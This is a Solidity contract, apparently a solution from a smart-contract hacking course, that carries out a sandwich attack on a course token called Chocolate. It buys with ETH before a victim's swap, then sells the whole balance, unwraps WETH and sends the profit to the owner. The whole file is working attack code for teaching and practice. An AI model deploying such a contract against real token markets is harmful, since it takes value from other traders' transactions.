// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
// https://smartcontractshacking.com/#copyright-policy
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import {Chocolate} from "./Chocolate.sol";

interface IWETH is IERC20 {
    function deposit() external payable;

    function transfer(address to, uint256 value) external returns (bool);

    function withdraw(uint256) external;
}

contract Sandwich is Ownable {
    IWETH public immutable weth;
    Chocolate public immutable chocolate;

    constructor(address _weth, address _chocolate) {
        weth = IWETH(_weth);
        chocolate = Chocolate(_chocolate);
    }

    function sandwich(bool isBuy) public payable {
        if (isBuy) {
            chocolate.swapChocolates{value: msg.value}(address(weth), msg.value);
        } else {
            uint256 chocBalance = chocolate.balanceOf(address(this));

            chocolate.approve(address(chocolate), chocBalance);
            chocolate.swapChocolates(address(chocolate), chocBalance);

            uint256 wethBalance = weth.balanceOf(address(this));

            weth.withdraw(wethBalance);

            (bool success,) = owner().call{value: address(this).balance}("");
            require(success, "Transfer failed.");
        }
    }

    receive() external payable {}
}
